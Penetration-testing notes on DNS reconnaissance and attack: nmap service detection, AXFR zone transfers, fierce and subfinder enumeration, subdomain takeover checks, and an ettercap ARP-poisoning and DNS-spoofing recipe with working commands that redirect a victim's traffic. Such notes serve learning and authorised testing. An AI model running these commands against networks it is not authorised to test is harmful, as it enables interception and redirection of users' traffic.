**DNS** (Domain Name System) is a hierarchical and distributed naming system that translates domain names into IP addresses. It enables clients to locate servers and services across networks. Due to its critical role in infrastructure, DNS is a common target for reconnaissance, information gathering, and attack techniques.

- Default protocol: **UDP/53**
    
- Zone transfers and large responses: **TCP/53**


---

## DNS Enumeration

### Service Detection with Nmap

```bash
nmap -p53 -Pn -sV -sC <target_ip>
```

- `-sV` → Version detection
    
- `-sC` → Default scripts
    
- Identifies DNS software (e.g., BIND, Microsoft DNS)
    

---

## DNS Zone Transfer (AXFR)

A DNS zone transfer allows replication of DNS records between servers.  
If misconfigured, anyone can request the full zone database.

### Attempt Zone Transfer with dig

```bash
dig AXFR @<dns_server_ip> <domain>
```

If successful, you obtain:

- A records
    
- MX records
    
- NS records
    
- Internal hostnames
    
- Subdomains

---

## DNS Enumeration with Fierce

```bash
fierce --domain target.com
```

Automates:

- NS enumeration
    
- Zone transfer attempts
    
- Subdomain discovery
    

---

## Subdomain Enumeration

### Passive Enumeration (Subfinder)

```bash
subfinder -d target.com -v
```

Uses OSINT sources.


---

## Subdomain Takeover

Occurs when:

- A subdomain points via CNAME to an external service
    
- The external resource is deleted or expired
    
- An attacker registers or recreates it

Check if a subdomain points to third-party services:

```bash
host sub.target.com
```

Example output:

```
sub.target.com is an alias for target.s3.amazonaws.com
```

If the external resource does not exist, it may be vulnerable to **subdomain takeover**.

Example DNS record:

```
sub.target.com  IN  CNAME  externaldomain.com
```

If `externaldomain.com` is unclaimed, attacker gains control of `sub.target.com`.

---

## DNS Spoofing (Cache Poisoning)

DNS spoofing injects malicious DNS responses to redirect traffic.

Attack methods:

- Man-in-the-Middle (MITM)
    
- Exploiting DNS server vulnerabilities
    
- Local network poisoning
    

### Local DNS Cache Poisoning with Ettercap

#### Modify DNS Mapping

Edit:

```bash
/etc/ettercap/etter.dns
```

Add:

```
target.com      A   192.168.1.100
*.target.com    A   192.168.1.100
```


#### Launch Ettercap

```bash
ettercap -T -q -i <interface> -M arp:remote /<victim_ip>/ /<gateway_ip>/ -P dns_spoof
```

This performs:

- ARP poisoning
    
- DNS spoofing
    
- Redirection of victim traffic
